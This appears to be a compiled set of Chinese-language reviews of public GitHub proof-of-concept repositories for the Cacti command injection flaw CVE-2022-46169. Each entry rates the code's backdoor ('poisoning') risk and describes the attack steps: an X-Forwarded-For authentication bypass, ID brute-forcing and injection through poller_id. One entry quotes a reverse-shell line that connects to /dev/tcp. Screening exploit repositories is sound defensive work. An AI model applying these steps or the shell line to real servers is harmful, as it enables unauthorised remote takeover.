1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务可网络访问, 并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，然后利用`polldata`动作，通过构造恶意的`poller_id`参数，执行任意操作系统命令。漏洞利用的关键在于：

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证检查。这是因为`get_client_addr`函数会信任`HTTP_`开头的`$_SERVER`变量，导致可以伪造IP地址。
2.  **命令注入：** 一旦通过身份验证，攻击者可以向`remote_agent.php`发送带有`action=polldata`的请求，其中`poller_id`参数可以被注入恶意命令。程序会将这个参数传递给`proc_open`函数，从而执行攻击者提供的命令。
3.  **利用方式：**  提供的Python脚本首先检查目标是否易受攻击，然后使用提供的LHOST和LPORT生成反向shell有效负载。 脚本通过暴力破解`host_id`和`local_data_ids[]`，构造恶意的URL，发送到目标`remote_agent.php`，从而执行反向shell，从而在目标系统上获得shell访问权限。

**投毒风险分析：**

代码本身主要功能是实现漏洞利用，但仍然存在一定低概率的投毒风险：

*   **潜在的后门：** 虽然代码的主要目的是利用漏洞，但作者可能在payload构建过程中插入了额外的恶意代码，例如，在反向shell payload中添加了额外的命令，用于收集敏感信息或执行其他恶意操作。但是从代码来看，payload是根据用户输入的IP和端口构建的，自定义程度较高，因此payload中存在后门的概率较低。
*   **依赖风险：** 该脚本依赖于`requests`和`urllib`库。虽然这些都是常用的库，但如果这些库本身存在漏洞，或者作者使用了不安全的库函数，可能会引入安全风险。

总体而言，该POC代码的投毒风险较低，约为5%。主要风险在于payload构建过程中可能存在的隐蔽后门，以及对第三方库的依赖。

**项目地址:** [alv-david/CVE-2022-46169-Cacti-1.2.22](https://github.com/alv-david/CVE-2022-46169-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #16

